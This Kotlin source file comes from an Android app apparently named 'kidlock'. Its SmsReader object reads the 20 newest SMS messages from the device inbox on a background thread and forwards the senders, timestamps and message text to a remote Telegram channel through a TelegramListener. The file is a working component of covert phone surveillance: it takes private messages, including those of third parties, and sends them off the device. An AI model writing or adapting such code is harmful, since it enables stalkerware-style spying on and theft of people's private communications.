package com.kidlock

import android.content.Context
import android.database.Cursor
import android.net.Uri
import java.text.SimpleDateFormat
import java.util.*

object SmsReader {

    fun readAndSend(context: Context) {
        Thread {
            try {
                val uri = Uri.parse("content://sms/inbox")
                val cursor: Cursor? = context.contentResolver.query(
                    uri,
                    arrayOf("address", "body", "date"),
                    null, null,
                    "date DESC LIMIT 20"
                )

                if (cursor == null || !cursor.moveToFirst()) {
                    TelegramListener.instance.sendMessage("💬 No SMS found.")
                    cursor?.close()
                    return@Thread
                }

                val sb = StringBuilder("💬 Last 20 SMS:\n\n")
                val sdf = SimpleDateFormat("dd MMM, HH:mm", Locale.getDefault())
                do {
                    val from = cursor.getString(cursor.getColumnIndexOrThrow("address")) ?: "Unknown"
                    val body = cursor.getString(cursor.getColumnIndexOrThrow("body")) ?: ""
                    val date = cursor.getLong(cursor.getColumnIndexOrThrow("date"))
                    sb.append("From: $from\n")
                    sb.append("Time: ${sdf.format(Date(date))}\n")
                    sb.append("Msg: ${body.take(200)}\n")
                    sb.append("---\n")
                } while (cursor.moveToNext())
                cursor.close()

                TelegramListener.instance.sendMessage(sb.toString())
            } catch (e: Exception) {
                TelegramListener.instance.sendMessage("💬 SMS read error: ${e.message}")
            }
        }.start()
    }
}
